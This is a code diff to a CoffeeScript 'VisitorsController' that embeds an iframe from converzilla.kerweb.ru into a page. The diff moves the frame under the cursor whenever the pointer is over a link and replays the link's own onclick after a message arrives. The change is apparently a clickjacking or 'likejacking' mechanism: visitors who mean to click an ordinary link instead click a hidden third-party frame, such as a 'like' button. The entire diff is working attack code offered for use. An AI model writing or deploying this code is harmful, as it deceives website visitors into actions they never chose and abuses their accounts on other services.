@@ -1,6 +1,7 @@
 class @VisitorsController
 
   host: 'http://converzilla.kerweb.ru'
+  element: null
   #host: 'http://localhost:3000'
 
   constructor: (clientId)->
@@ -9,8 +10,14 @@ class @VisitorsController
     eventMethod = (if window.addEventListener then "addEventListener" else "attachEvent")
     eventer = window[eventMethod]
     messageEvent = (if eventMethod is "attachEvent" then "onmessage" else "message")
+    clickEvent   = (if eventMethod is "attachEvent" then "onblur" else "blur")
 
-    eventer(messageEvent, (e) ->
+    eventer(messageEvent, (e) =>
+      if @element
+        @element.onclick()
+    , false);
+
+    eventer(clickEvent, (e) ->
       $('#wrap1').remove() if  e.data == 'like'
     , false);
 
@@ -20,8 +27,9 @@ class @VisitorsController
     			<iframe src='#{@host}/catching?id=#{@clientId}'></iframe>
     	</div>
     "
-    $(window).on 'mousemove', (e) ->
-      if $(event.target).is("a")
+    $(window).on 'mousemove', (e) =>
+      @element = $(event.target)
+      if @element.is("a")
         $('#wrap1').css {left:  e.pageX - 20, top:   e.pageY - 12 }
 
 
